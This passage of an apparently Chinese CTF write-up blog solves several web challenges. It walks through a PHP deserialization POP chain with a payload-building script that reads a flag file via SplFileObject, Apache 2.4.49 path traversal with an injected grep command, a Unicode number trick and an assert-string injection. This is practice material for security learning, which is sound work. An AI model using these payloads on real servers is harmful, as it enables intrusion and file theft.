class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看上去有点多，但是链子不长。</p><p>从后往前找，找rce的地方或者文件读取的地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这东西怎么跟原生类的foreach这么像呢？？查一下array_walk，发现是调用回调函数的一个函数</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png" alt="image-20241231103913709"></p><p>尾部找到了，往上找，</p><p>E类的get魔术方法，调用不存在的属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子结束：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__get() -&gt; Heraclqs::__invoke() -&gt;Sakura::__toString() -&gt;Sakura::__destruct()</span><br></pre></td></tr></table></figure><p>这里需要绕过的就是md5，很简单，我有脚本的。</p><p>然后需要注意的就是array_walk了！</p><p>先自己本地测一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Monday =&gt; &quot;</span>.<span class="variable">$Monday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Tuesday =&gt; &quot;</span>.<span class="variable">$Tuesday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="comment">// $Wednesday = new $Tuesday($Monday);</span></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;e = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaaa = <span class="string">&quot;321&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">print</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#Monday =&gt; 123 | Tuesday =&gt; e | Monday =&gt; 321 | Tuesday =&gt; aaaa | </span></span><br></pre></td></tr></table></figure><p>ok知道怎么利用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&#x27;5659&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sakura</span> = <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;apple=<span class="variable">$sakura</span>;</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape-&gt;<span class="built_in">SplFileObject</span>=<span class="string">&#x27;/1_ffffffflllllagggggg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sakura</span>));</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png" alt="image-20241231104320343" style="zoom: 67%;" /><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>打开后页面里啥也没有，扫目录也没什么特别关键的信息。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png" alt="image-20250101090545818"></p><p>看到一堆cgi？？看上去像是任意文件读取，但是复制粘贴过去发现不行，看看框架。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png" alt="image-20250101090618525" style="zoom: 67%;" /><p>Apache2.4.49，搜下有没有洞。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png" alt="image-20250101090736212"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png" alt="image-20250101091459532"></p><p>路径穿越</p><p>但我们直接试cgi-bin目录下是不可以的。</p><p>但是这个可以&#x2F;cgi-bin&#x2F;test-cgi</p><p>然后我们就可以</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png" alt="image-20250101091449658" style="zoom:67%;" /><p>可以grep遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo;grep -r &quot;NSS&quot; /flag_is_here</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png" alt="image-20250101091544695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;5949084d-677b-43d8-ae0e-f156c491e4f2&#125;</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png" alt="image-20250101085153202" style="zoom:80%;" /><p>这里先尝试id1，和价格2</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png" alt="image-20250101085554674"></p><p>这里显示商品错误</p><p>然后尝试id，1,2,3都是一样的错误</p><p>id&#x3D;4时，输入1337的错误是<code>only one char</code></p><p>只能输入一个字符</p><p>这里利用的漏洞是unicode安全问题，是关于Unionde等价性的漏洞</p><p>这里由于只能输入一个字符，所以这里利用了<a href="https://so.csdn.net/so/search?q=utf-8%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">utf-8编码</a>。</p><p>两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。</p><p>这里在compart网站上找一个大于1337的值,于是我们需要找到一个字符比1337大的数字</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>在搜索框中搜索thousand</p><p>这里我选择了罗马数字十万，数值是100000</p><p>utf-8的值是0xE2 0x86 0x88</p><p>这里直接使用utf-8的话是不行的</p><p>将utf-8的值中的0x变为%</p><p>%E2%86%88</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png" alt="image-20250101085700376"></p><h2 id="NSSRound-17-Basic-真·签到"><a href="#NSSRound-17-Basic-真·签到" class="headerlink" title="[NSSRound#17 Basic]真·签到"></a>[NSSRound#17 Basic]真·签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现关键点是 <code>$_GET[&#39;nss&#39;] == 732339662</code> 和 <code>assert(&quot;is_numeric($_GET[nss])==0&quot;)</code></p><p>此处 assret 直接采用字符串 assert, 也就是说传入的变量会被直接解析出来拼接到代码中</p><p>弱比较的话只需要字符串前面是相同数字, 后面无论拼接了什么都不会管了</p><p>于是我们什么都可以构造, 比如 <code>732339662) or (1</code> 即可拿 flag</p><h2 id="NSSRound-16-Basic-了解过PHP特性吗"><a href="#NSSRound-16-Basic-了解过PHP特性吗" class="headerlink" title="[NSSRound#16 Basic]了解过PHP特性吗"></a>[NSSRound#16 Basic]了解过PHP特性吗</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span 